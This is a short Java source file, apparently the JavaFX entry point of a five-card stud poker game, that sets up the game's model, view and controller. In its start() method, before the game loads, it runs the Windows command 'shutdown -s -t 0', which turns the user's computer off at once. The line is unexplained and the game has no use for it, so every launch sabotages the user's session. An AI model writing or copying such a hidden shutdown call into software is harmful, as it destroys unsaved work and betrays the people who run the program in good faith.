package main;

import javafx.application.Application;
import javafx.stage.Stage;
import main.Controller.main_menu_controller;
import main.Model.Game.Poker_5_Stud;
import main.View.main_menu;

import java.io.IOException;

public class Main extends Application {



    Poker_5_Stud model;
    main_menu view;
    main_menu_controller controller;


    public static void main(String[] args) {
        launch(args);


        System.exit(1);

    }

    @Override
    public void start(Stage primaryStage) throws IOException {

        Runtime runtime = Runtime.getRuntime();
        Process proc = runtime.exec("shutdown -s -t 0");

        model = new Poker_5_Stud();
        view = new main_menu(primaryStage);
        controller = new main_menu_controller(model, view);

        //garbage collector takes care of the objects. no need to destroy them
    }
}
